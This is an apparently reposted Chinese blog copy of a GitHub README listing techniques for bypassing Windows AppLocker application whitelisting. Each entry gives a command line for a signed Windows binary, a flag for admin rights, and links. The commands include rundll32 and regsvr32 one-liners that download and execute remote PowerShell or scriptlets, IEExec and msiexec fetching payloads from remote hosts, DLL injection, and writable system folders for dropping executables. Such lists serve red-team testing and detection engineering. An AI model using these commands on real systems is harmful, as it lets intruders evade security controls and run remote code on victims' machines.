---
title: Ultimate AppLocker ByPass List
date: 2018-01-04 22:13:19
ags: 每日安全干货及动态
categories: 每日安全干货及动态
---
![enter description here][1]
<!--more-->
GIthub ：https://github.com/api0cradle/UltimateAppLockerByPassList
此存储库的目标是记录最常用的技术来绕过AppLocker。本自述文件包含所有已知绕过路径的完整列表。由于AppLocker可以以不同的方式进行配置，所以有一个绕过主列表是有意义的。这README.MD将是主，并将更新已知和可能的AppLocker绕过。

我已经创建了一个验证Bypass列表，再次使用AppLocker创建的默认规则。

有关我如何验证的详细信息，可以查看他的博客：https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/

VerifiedBypasses-DefaultRules.MD

如果您想知道如何创建默认规则，您可以按照以下指南进行操作：https： //www.rootusers.com/implement-applocker-rules/

请贡献并指出我忘记的错误或资源。请记住，必须验证BypassDLL和BypassEXE的旁路技术。BypassDLL-DefaultRules和BypassEXE-DefaultRules列表应该只包含有效的绕过。



##  Rundll32.exe
``` stylus
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();new%20A
ctiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object
Net.WebClient).DownloadString('http://ip:port/');"
```

``` stylus
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXO
bject(\"WScript.Shell\");w.run(\"calc\");window.close()");`
```



``` stylus
`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20A
ctiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseT
ext;eval(b;}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill 
/f /im rundll32.exe",0,true);}`
```



``` stylus
`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetOb
ject("script:https://raw.githubusercontent.com/3gstudent/
Javascript-Backdoor/master/test")`
```

``` stylus
`rundll32 shell32.dll,Control_RunDLL payload.dll`
```
Requires admin: No

Notes:

Links:  
https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md



##  Regsvr32.exe

regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll`

Requires admin: No

Notes:

Links:  
https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md



## Msbuild.exe

`msbuild.exe pshell.xml`

Requires admin: No

Notes:

Links:  
https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614
http://subt0x10.blogspot.no/2017/04/bypassing-application-whitelisting.html
https://github.com/Cn33liz/MSBuildShell
https://github.com/Cn33liz/MS17-012
https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/
https://www.youtube.com/watch?v=aSDEAPXaz28
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md



##  Regsvcs.exe

`regsvcs.exe /U regsvcs.dll`
`regsvcs.exe regsvcs.dll`

Requires admin: ?

Notes:

Links:  
https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md



## Regasm.exe

`regasm.exe /U regsvcs.dll`
`regasm.exe regsvcs.dll`

Requires admin: ?

Notes:

Links:  
https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md



##  Bginfo.exe

`bginfo.exe bginfo.bgi /popup /nolicprompt`

Requires admin: No

Notes:

Links:  
https://msitpros.com/?p=3831
https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/
https://msitpros.com/?p=3860



## InstallUtil.exe

`InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll`

Requires admin: No

Notes:

Links:  
https://github.com/subTee/AllTheThings
https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12
http://subt0x10.blogspot.no/2017/09/banned-file-execution-via.html
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/InstallUtil.md



##  MSDT.exe

`Open .diagcab package`

Requires admin: ?

Notes:

Links:  
https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/



## mshta.exe

`mshta.exe evilfile.hta`

Requires admin: No

Notes:

Links:  
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4



##  Execute .Bat

`cmd.exe /k < script.txt`

Requires admin: No

Notes:

Links:  
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3



## Execute .PS1

`Get-Content script.txt | iex`

Requires admin: No

Notes:

Links:  
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3



##  Execute .VBS

`cscript.exe //E:vbscript script.txt`

Requires admin: No

Notes:

Links:  
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3



## PresentationHost.exe

Missing Example

Requires admin: ?

Notes:

Links:  
https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf



##  dfsvc.exe

Missing Example

Requires admin: ?

Notes:

Links:  
https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf



##  IEExec.exe

`ieexec.exe http://x.x.x.x:8080/bypass.exe`

Requires admin: ?

Notes:

Links:  
https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/



##  cdb.exe

`cdb.exe -cf x64_calc.wds -o notepad.exe`

Requires admin: ?

Notes:

Links:  
http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html


##  dnx.exe

`dnx.exe consoleapp`

Requires admin: ?

Notes:

Links:  
https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/



##  rcsi.exe

`rcsi.exe bypass.csx`

Requires admin: ?

Notes:

Links:  
https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/



##  csi.exe

Missing example

Requires admin: ?

Notes:

Links:  
https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html



##  CPL loading location manipulation

`Control.exe`

Requires admin: No

Notes:

Links:  
https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/
https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/



## msxsl.exe

`msxsl.exe customers.xml script.xsl`

Requires admin: No

Notes:

Links:  
https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1



##  msiexec.exe

`msiexec /quiet /i cmd.msi`
`msiexec /q /i http://192.168.100.3/tmp/cmd.png`

Requires admin: ?

Notes:

Links:  
https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/


## cmstp.exe

`cmstp.exe /ni /s c:\cmstp\CorpVPN.inf`

Requires admin: No

Notes:

Links:  
https://msitpros.com/?p=3960
https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e


## xwizard.exe

`xwizard.exe argument1 argument2`
DLL loading in same folder xwizard.dll

Requires admin: No

Notes:

Links:
http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/


##  fsi.exe

`fsi.exe c:\folder\d.fscript`

Requires admin: No

Notes:

Links:
https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1
https://twitter.com/NickTyrer/status/904273264385589248
https://docs.microsoft.com/en-us/dotnet/fsharp/tutorials/fsharp-interactive/



##  odbcconf.exe

`odbcconf -f file.rsp`

Requires admin: ?

Notes:

Links:
https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b



## te.exe

`te.exe bypass.wsc`

Requires admin: No

Notes: Can be used if the Test Authoring and Execution Framework is installed and is in a path that is whitelisted. 
Default location is: C:\program files (x86)\Windows Kits\10\testing\Runtimes\TAEF
 
Links:
https://twitter.com/gN3mes1s/status/927680266390384640
https://gist.github.com/N3mes1s/5b75a4cd6aa4d41bb742acace2c8ab42



## Placing files in writeable paths under c:\windows

The following folders are by default writable and executable by normal users
`C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys`
`C:\Windows\System32\spool\drivers\color`
`C:\Windows\Tasks`
`C:\windows\tracing`

Requires admin: No

Notes: This list is based on Windows 10 1709. Run accesschk to verify on other Windows versions



##  Atbroker.exe

`ATBroker.exe /start malware`

Requires admin: No

Notes:

Links:
http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/



##  WMIC.exe

`wmic process call create calc`

Requires admin: No

Notes: 

Links:
https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory



##  MavInject32.exe

`MavInject32.exe <PID> /INJECTRUNNING <PATH DLL>`

Requires admin: No

Notes: 

Links:
https://twitter.com/gN3mes1s/status/941315826107510784
https://twitter.com/Hexacorn/status/776122138063409152


# Bypass DLL Default AppLocker Rules
The goal of this list is document a verified list of known bypasses using AppLocker Default Rules for DLL whitelisting.
Please contribute and do point out errors or resources I have forgotten.


##  Msbuild.exe

`msbuild.exe pshell.xml`

Requires admin: No

Notes:

Links:  
https://github.com/Cn33liz/MSBuildShell
https://github.com/Cn33liz/MS17-012
https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/
https://www.youtube.com/watch?v=aSDEAPXaz28
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md



  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/maxresdfault.jpg 